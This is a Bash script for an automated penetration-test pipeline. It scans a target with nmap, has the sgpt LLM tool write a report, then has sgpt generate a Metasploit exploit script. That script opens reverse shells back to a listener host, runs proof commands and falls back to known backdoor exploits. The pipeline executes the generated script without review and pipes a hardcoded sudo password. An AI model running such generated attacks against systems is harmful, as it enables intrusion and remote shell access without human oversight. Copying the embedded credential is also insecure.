#!/usr/bin/env bash
# run_pipeline.sh — Automate 5-step pentest workflow (integrated nmap, explicit LHOST/LPORT)
#
# Usage:
#   ./run_pipeline.sh <TARGET_IP> <LHOST> <LPORT>
# Example:
#   ./run_pipeline.sh 192.168.56.102 192.168.56.1 4444

set -euo pipefail

if [[ $# -lt 3 ]]; then
  echo "Usage: $0 <TARGET_IP> <LHOST> <LPORT>    e.g., $0 192.168.56.102 192.168.56.1 4444"
  exit 2
fi

TARGET_IP="$1"
LHOST="$2"
LPORT="$3"

# --- Step 1: Nmap scan (integrated from nmap_ai.sh) ---
echo "[*] Step 1/5: Running Nmap scan on ${TARGET_IP} ..."
TS="$(date +%Y%m%d-%H%M%S)"
SCAN_FILE="scan_${TARGET_IP}_.nmap"

if ! command -v nmap >/dev/null 2>&1; then
  echo "[!] nmap not installed. Install nmap and retry."
  exit 3
fi

echo "[*] nmap -sV --script vulners -T4 -oN \"$SCAN_FILE\" \"$TARGET_IP\""
nmap -sV --script vulners -T4 -oN "$SCAN_FILE" "$TARGET_IP"

if [[ ! -f "${SCAN_FILE}" ]]; then
  echo "[!] Expected scan output not found: ${SCAN_FILE}"
  echo "    Check that nmap ran successfully and retry."
  exit 4
fi

echo "[✓] Scan complete: ${SCAN_FILE}"

# --- Step 2: Create AI report from scan (with injected variables) ---
echo "[*] Step 2/5: Generating professional penetration test report with sgpt ..."
REPORT_FILE="scan_${TARGET_IP}_report.md"

# Build a small header containing the variables and then stream header + scan into sgpt
{
  printf "VARIABLES:\nTARGET_IP: %s\nLHOST: %s\nLPORT: %s\n\n" "$TARGET_IP" "$LHOST" "$LPORT"
  cat "${SCAN_FILE}"
} | sgpt --temperature 0 "You are a penetration tester. The input stream begins with VARIABLES (Target IP, LHOST, LPORT) followed by an Nmap + Vulners scan. Analyze and produce a professional penetration test report with the following sections (format in Markdown):

0. Target IP, LHOST, LPORT
1. Executive Summary – high-level overview of the security posture and risks.
2. Target Information – IP, hostnames, OS, open ports/services.
3. Detailed Findings – for each service: version, CVEs (with CVSS), known exploits (Metasploit/Exploit-DB), verification steps, impact, remediation.
4. Prioritized Attack Path – the most likely exploitation sequence.
5. Recommendations / Quick Wins – patching and mitigation steps.

Important:
- Populate section 0 with the exact VARIABLE values from the top of the input.
- When listing exploits, show module names and any CVE numbers found.
- Keep the report concise and use bullet lists for findings." | tee "${REPORT_FILE}"

echo "[✓] Report saved -> ${REPORT_FILE}"

# --- Step 3: Generate exploit script with sgpt (robust prompt) ---
echo "[*] Step 3/5: Generating exploit script with sgpt ..."
EXPLOIT_FILE="exploit.sh"

cat "${REPORT_FILE}" | sgpt --temperature 0 'Read the scan report from STDIN and return ONLY a Bash script. Requirements:
1. Start with a shebang (#!/usr/bin/env bash).
2. Define and use Target IP, LHOST, and LPORT where necessary and or required. Get these values from the report, DO NOT use placeholders.
3. Attempt the highest-priority vulnerability first (prefer RCE > code exec > auth bypass > info leak).4. The script must be POSIX/bash-safe and pass a quick syntax check (include a line that runs "bash -n" or "shellcheck" at the end).
4. All msfconsole -x invocations MUST have the entire command string wrapped in double quotes. Use the resource-file approach for complex/long module sequences.
5. Use a handler-first approach: create an msf resource handler that runs exploit/multi/handler with ExitOnSession false before calling exploits. Force reverse payloads (cmd/unix/reverse_bash) for bind-style modules.
6. Include verbose progress echos, and artifact directory (timestamped).
7. After successful session, automatically run proof commands (whoami, id, uname -a, pwd) and save outputs in artifacts/.
8. Echo progress clearly for each exploit, and try the next vulnerability if the first fails.
9. If metasploit modules do not work or exist, fall back to low-friction PoCs like vsftpd backdoor or ProFTPD mod_copy or common vulnerability exploits.
Return only the Bash script, no commentary.' |& tee "${EXPLOIT_FILE}"

if [[ ! -f "${EXPLOIT_FILE}" ]]; then
  echo "[!] Expected exploit file not generated: ${EXPLOIT_FILE}"
  exit 6
fi

echo "[✓] Exploit script generated -> ${EXPLOIT_FILE}"


# --- Step 4 ---
echo "[*] Step 4/5: Marking exploit.sh as executable ..."
if chmod +x exploit.sh 2>/dev/null; then
  echo "    [+] chmod +x exploit.sh (no sudo needed)"
else
  if command -v sudo >/dev/null 2>&1; then
    echo "kali" | sudo -S chmod +x exploit.sh >/dev/null
    echo "    [+] chmod +x exploit.sh via sudo."
  else
    echo "[!] sudo not available and chmod without sudo failed. Run: chmod +x exploit.sh"
    exit 5
  fi
fi

# --- Step 5: Run exploit script with provided LHOST/LPORT ---
echo "[*] Step 5/5: Executing exploit script ..."
./"${EXPLOIT_FILE}"

echo
echo "[✓] Pipeline complete."
echo "    Target IP : ${TARGET_IP}"
echo "    LHOST     : ${LHOST}"
echo "    LPORT     : ${LPORT}"
echo "    Scan file : ${SCAN_FILE}"
echo "    Report    : ${REPORT_FILE}"
echo "    Exploit   : ./${EXPLOIT_FILE}"
